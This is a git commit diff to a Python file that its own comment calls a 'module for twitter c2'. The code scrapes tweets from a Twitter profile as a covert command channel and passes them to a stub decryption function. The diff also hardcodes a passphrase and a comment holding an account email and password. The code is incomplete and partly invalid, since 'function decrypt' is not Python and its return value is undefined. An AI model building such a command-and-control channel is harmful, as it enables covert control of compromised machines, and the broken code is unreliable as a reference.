9c63bdd2ac070d864d86d8731be4ca00fa14aa38
conanthebrobarian <mike@mint-WARROOM.(none)>
2014-05-16 23:06:23 -0500

    need to add encrypt/decrypt functionality

--- tweet2.py
+++ tweet2.py
@@ -1,14 +1,28 @@
 # module for twitter c2
+# kolache2 : a3829593@drdrb.net : Fl@kyP@stry!@#!@#
 
 import urllib
 
+passphrase = "bananahead"
+
+function decrypt(message):
+	
+	return decmessage
+
 #need to fix for actual twitter handle
-urlhandle = urllib.urlopen("http://twitter.com/kolache")
+urlhandle = urllib.urlopen("http://twitter.com/kolache2")
 urldata = urlhandle.read()
 
-while c<len(urldata):
-	ccont = urldata.find("js-tweet-text tweet-text",c)
+c=0
+while c < len(urldata):
+	ccont = urldata.find("js-tweet-text", c)
+	if ccont == -1:
+		# nothing to do here
+		print("No tweets available")
+		exit(-1)
 	prstr = urldata[ccont:urldata.find("</p>",ccont)]
 	# add in parsing of commands here in place of print
-	print prstr
+	encstr = prstr[prstr.find(">")+1:]
+	decstr = decrypt(encstr)
+	print decstr
 	c = c + ccont + len(prstr)
